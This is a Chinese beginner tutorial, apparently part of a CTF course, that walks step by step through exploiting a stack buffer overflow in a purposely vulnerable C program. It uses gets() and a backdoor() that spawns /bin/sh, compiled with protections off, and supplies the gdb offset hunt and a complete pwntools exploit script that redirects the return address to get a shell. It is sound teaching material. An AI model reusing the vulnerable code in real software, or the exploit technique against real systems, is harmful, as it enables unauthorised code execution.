# 超详细动手实验：栈溢出从编译到 get shell 的逐字节之旅

> 配套：03-core-game 第 7 关《栈溢出》/ 01-core 第 8 章
> 这是一份"保姆级"实验，每一步都告诉你**做什么、看到什么、为什么**。
> 建议照着敲一遍，亲眼看到"回城卷轴被涂改"的那一刻。

---

## 🎯 实验目标

从一个有漏洞的程序出发，亲手完成一次栈溢出攻击，最终拿到 shell。全程你会看到：

1. 漏洞函数怎么产生
2. 偏移是怎么算出来的（不是猜的）
3. payload 的每个字节分别改了内存的哪里
4. `ret` 指令如何跳到你指定的地址

---

## 🧰 实验准备

需要：Linux（Ubuntu 22.04）、gcc、gdb、pwntools、checksec。

```bash
sudo apt install -y gdb gcc python3-pip
sudo pip3 install pwntools
```

---

## 第 1 步：写一个有漏洞的程序

```c
// workshop.c
#include <stdio.h>
#include <stdlib.h>

// 隐藏关卡：直接给 shell
void backdoor() {
    system("/bin/sh");
}

// 有漏洞的函数
void vulnerable() {
    char buf[16];          // 只能装 16 字节的盘子
    puts("请输入：");
    gets(buf);             // 危险！完全不检查输入长度
    printf("你输入的是：%s\n", buf);
}

int main() {
    vulnerable();
    return 0;
}
```

**关键点**：`gets(buf)` 会一直读到你按回车，不管 buf 只有 16 字节。多出来的字符会往栈的高地址"漫"出去。

编译（关掉所有保护，做新手实验）：

```bash
gcc -g -O0 -fno-stack-protector -no-pie workshop.c -o workshop
```

参数解释：

| 参数 | 作用 | 游戏说法 |
| --- | --- | --- |
| `-g` | 加调试信息 | 给地图加图例 |
| `-O0` | 不优化 | 保留代码原貌，方便看 |
| `-fno-stack-protector` | 关闭 Canary | 拆掉警报器 |
| `-no-pie` | 关闭地址随机 | 固定城市布局 |

确认保护状态：

```bash
checksec --file=workshop
```

应该看到 `No canary found`、`No PIE`。

---

## 第 2 步：找到后门地址

```bash
nm workshop | grep backdoor
```

输出类似：

```
0000000000401176 T backdoor
```

记下这个地址 `0x401176`（**你的机器可能不同，以实际输出为准**）。这就是我们要跳过去的"隐藏关卡入口"。

---

## 第 3 步：验证漏洞存在（先让它崩）

先用 pwntools 生成一串"不重复"的测试字符串（cyclic pattern），喂给程序：

```bash
python3 -c "from pwn import *; print(cyclic(100))" | ./workshop
```

程序会崩溃，输出 `Segmentation fault`。这证明输入确实能冲垮栈。

**为什么用 cyclic pattern？** 因为它每个 4 字节都不同，崩溃后我们能在寄存器里找到它的"指纹"，反推出精确的偏移。

---

## 第 4 步：精确计算偏移（不是猜的！）

用 gdb 跑，把 pattern 作为输入：

```bash
gdb ./workshop
(gdb) run < <(python3 -c "from pwn import *; print(cyclic(100))")
```

程序崩溃后，gdb 会停下。查看崩溃时的指令指针：

```bash
(gdb) x/i $rip
(gdb) info registers rsp rip
```

你会看到 `rip` 或 `rsp` 里有一串奇怪的十六进制值，比如 `0x6161616a61616169`。这是 pattern 的一部分（ASCII: `iaajaaaa`）。

现在用 pwntools 反查这个指纹在 pattern 里的位置：

```python
python3 -c "from pwn import *; print(cyclic_find(0x6161616a61616169))"
```

输出应该是一个数字，比如 **24**。这就是偏移——从 buf 开头到返回地址的距离。

> 直觉验证：buf 是 16 字节 + 保存的 rbp 8 字节 = 24 字节。和计算结果吻合！

---

## 第 5 步：构造 payload（逐字节拆解）

```python
# exp.py
from pwn import *

p = process('./workshop')
backdoor = 0x401176        # 换成你 nm 查到的地址
offset = 24                # 第 4 步算出来的

payload  = b'A' * offset          # ① 24字节：填满buf(16) + 覆盖rbp(8)
payload += p64(backdoor)          # ② 8字节：覆盖返回地址为后门函数

p.sendline(payload)
p.interactive()                   # 如果成功，进入shell
```

**逐字节看 payload 做了什么**：

```
内存（低地址 → 高地址）：
  ┌──────────────────────────┐
  │ buf[16]  = 'A'*16         │  ← ①的前16字节，填满盘子
  ├──────────────────────────┤
  │ 旧 rbp   = 'A'*8          │  ← ①的后8字节，冲垮底座
  ├──────────────────────────┤
  │ 返回地址 = 0x401176       │  ← ②，涂改回城卷轴！
  └──────────────────────────┘
```

`p64(backdoor)` 把 `0x401176` 打包成 8 字节小端序：`76 11 40 00 00 00 00 00`。

---

## 第 6 步：用 gdb 亲眼看到涂改过程（最关键的一步）

在 `vulnerable` 函数即将 `ret` 的地方下断点，观察栈：

```bash
gdb ./workshop
(gdb) break vulnerable
(gdb) run
# 程序等你输入，这时在另一个终端生成payload，或直接在这里输入：
(gdb) # 输入 'A'*24 加上后门地址的字节
```

更简单的办法——在 gdb 里跑你的 exp：

```python
# 在 exp.py 里改用 gdb.debug
p = gdb.debug('./workshop', 'break *vulnerable+40')
```

然后：

```bash
(gdb) x/6gx $rsp        # 看栈顶开始的内存
```

你会看到：

```
0x7fff...:  0x4141414141414141   0x4141414141414141   ← 满眼 A
0x7fff...:  0x4141414141414141   0x0000000000401176   ← 返回地址被改成了后门！
```

**这一刻，你就亲眼看到了"回城卷轴被涂改"。**

继续单步：

```bash
(gdb) stepi    # 执行 ret
(gdb) info registers rip    # rip 变成了 0x401176！
```

`ret` 把栈上的 `0x401176` 弹进了 rip，程序跳到了 backdoor。

---

## 第 7 步：拿到 shell

回到正常 exp：

```bash
python3 exp.py
```

如果一切正确，你会看到 `$` 提示符。试试：

```bash
$ whoami
root
$ ls
exp.py  workshop  workshop.c
```

**恭喜，你完成了人生第一次完整的栈溢出攻击！**

---

## 🧠 常见问题排查

| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 程序崩在 `ret` 前 | 偏移算错 | 重新用 cyclic 测偏移 |
| 没拿到 shell 但没崩 | 地址写错 | 重新 `nm` 查 backdoor 地址 |
| 提示 PIE 相关错误 | 编译时没关 PIE | 加 `-no-pie` 重编译 |
| 栈对齐崩溃（movaps） | 16字节对齐问题 | 在返回地址前加一个 `p64(ret)` gadget |

---

## 🎓 你学到了什么

| 步骤 | 技能 |
| --- | --- |
| 写代码 | 识别危险函数 `gets` |
| 编译 | 用 gcc 开关控制保护 |
| 找地址 | `nm` 找函数地址 |
| 测偏移 | cyclic pattern + gdb 反查 |
| 构造 | `p64()` 小端序打包 |
| 验证 | gdb 看栈、单步跟踪 ret |
| 利用 | `interactive()` 拿 shell |

这套流程适用于**所有栈溢出题**。题目变复杂，只是加保护（Canary/PIE/NX）和换目标（ret2libc/ROP），但"找偏移 → 改返回地址 → 控 rip"的核心不变。

---

## 🎬 下一步

- 想学 NX 开启后怎么办 → 03-core-game 第 10 关 ret2libc、第 11 关 ROP
- 想学 Canary 怎么破 → 第 12 关
- 想深入原理 → 01-core 第 8~13 章

祝闯关愉快！🎮
